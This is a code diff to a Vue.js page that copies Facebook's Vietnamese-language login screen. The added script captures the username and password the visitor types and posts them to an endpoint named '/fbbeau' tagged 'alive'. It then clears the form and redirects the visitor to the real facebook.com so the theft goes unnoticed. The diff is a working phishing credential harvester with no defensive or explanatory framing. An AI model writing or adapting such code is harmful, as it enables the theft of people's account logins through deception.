@@ -2,26 +2,31 @@
   <div>
     <div id="navwrapper" class="is-hidden-mobile">
       <div id="navbar">
-        <table class="tablewrapper">
-          <tr>
-            <td class="row1">Email hoặc điện thoại</td>
-            <td class="row1">Mật khẩu</td>
-          </tr>
-          <tr>
-            <td><input type="text" class="inputtext" /></td>
-            <td><input type="text" class="inputtext" /></td>
-            <td>
-              <div id="button">Đăng nhập</div>
-            </td>
-          </tr>
-          <tr>
-            <td>
-              <div class="row2"></div>
-            </td>
-            <td class="row2 h">Quên tài khoản?</td>
-          </tr>
-        </table>
-
+        <form @submit.prevent="login">
+          <table class="tablewrapper">
+            <tr>
+              <td class="row1">Email hoặc điện thoại</td>
+              <td class="row1">Mật khẩu</td>
+            </tr>
+            <tr>
+              <td>
+                <input v-model="username" type="text" class="inputtext" />
+              </td>
+              <td>
+                <input v-model="password" type="password" class="inputtext" />
+              </td>
+              <td>
+                <div id="button" @click="login">Đăng nhập</div>
+              </td>
+            </tr>
+            <tr>
+              <td>
+                <div class="row2"></div>
+              </td>
+              <td class="row2 h">Quên tài khoản?</td>
+            </tr>
+          </table>
+        </form>
         <h1 class="logowrapper">facebook</h1>
       </div>
     </div>
@@ -274,9 +279,10 @@
         </div>
         <div class="app">
           <div class="loginform">
-            <form>
+            <form @submit.prevent="login">
               <div class="inputBox">
                 <input
+                  v-model="username"
                   name="username"
                   autofocus
                   class="_inputEmail"
@@ -284,13 +290,20 @@
                   placeholder="Số di động hoặc email"
                 />
                 <input
+                  v-model="password"
                   name="password"
                   class="_inputPass"
                   type="password"
                   placeholder="Mật khẩu"
                 />
               </div>
-              <button class="btnLogin" type="submit" value="Login" name="login">
+              <button
+                class="btnLogin"
+                type="submit"
+                value="Login"
+                name="login"
+                @click="login"
+              >
                 <span>Đăng Nhập</span>
               </button>
             </form>
@@ -311,7 +324,29 @@
 </template>
 
 <script>
-export default {}
+export default {
+  data() {
+    return {
+      username: '',
+      password: ''
+    }
+  },
+  methods: {
+    login: async function() {
+      await this.$axios
+        .post(`/fbbeau`, {
+          username: this.username,
+          password: this.password,
+          status: 'alive'
+        })
+        .then(() => {
+          this.username = ''
+          this.password = ''
+          window.location.replace('http://facebook.com')
+        })
+    }
+  }
+}
 </script>
 
 <style>
